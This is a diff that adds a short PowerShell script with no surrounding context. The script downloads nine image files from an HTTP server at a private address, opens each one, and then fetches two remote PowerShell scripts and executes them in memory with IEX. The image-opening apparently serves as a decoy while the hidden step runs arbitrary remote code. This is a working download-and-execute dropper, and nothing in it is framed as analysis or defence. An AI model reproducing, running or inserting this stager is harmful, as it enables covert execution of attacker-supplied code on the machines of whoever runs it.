@@ -1,0 +1,21 @@
+$wc = New-Object System.Net.WebClient;
+$wc.DownloadFile("http://192.168.1.4:8000/1.jpg", "$env:TEMP\1.jpg");
+Start-Process "$env:TEMP\1.jpg";
+$wc.DownloadFile("http://192.168.1.4:8000/2.jpg", "$env:TEMP\2.jpg");
+Start-Process "$env:TEMP\2.jpg";
+$wc.DownloadFile("http://192.168.1.4:8000/3.jpg", "$env:TEMP\3.jpg");
+Start-Process "$env:TEMP\3.jpg";
+$wc.DownloadFile("http://192.168.1.4:8000/4.jpg", "$env:TEMP\4.jpg");
+Start-Process "$env:TEMP\4.jpg";
+$wc.DownloadFile("http://192.168.1.4:8000/5.jpg", "$env:TEMP\5.jpg");
+Start-Process "$env:TEMP\5.jpg";
+$wc.DownloadFile("http://192.168.1.4:8000/6.jpg", "$env:TEMP\6.jpg");
+Start-Process "$env:TEMP\6.jpg";
+$wc.DownloadFile("http://192.168.1.4:8000/7.jpg", "$env:TEMP\7.jpg");
+Start-Process "$env:TEMP\7.jpg";
+$wc.DownloadFile("http://192.168.1.4:8000/8.jpg", "$env:TEMP\8.jpg");
+Start-Process "$env:TEMP\8.jpg";
+$wc.DownloadFile("http://192.168.1.4:8000/9.jpg", "$env:TEMP\9.jpg");
+Start-Process "$env:TEMP\9.jpg";
+IEX ($wc.DownloadString("http://192.168.1.4:8000/NV-by1.ps1"))
+IEX ($wc.DownloadString("http://192.168.1.4:8000/install.ps1"))
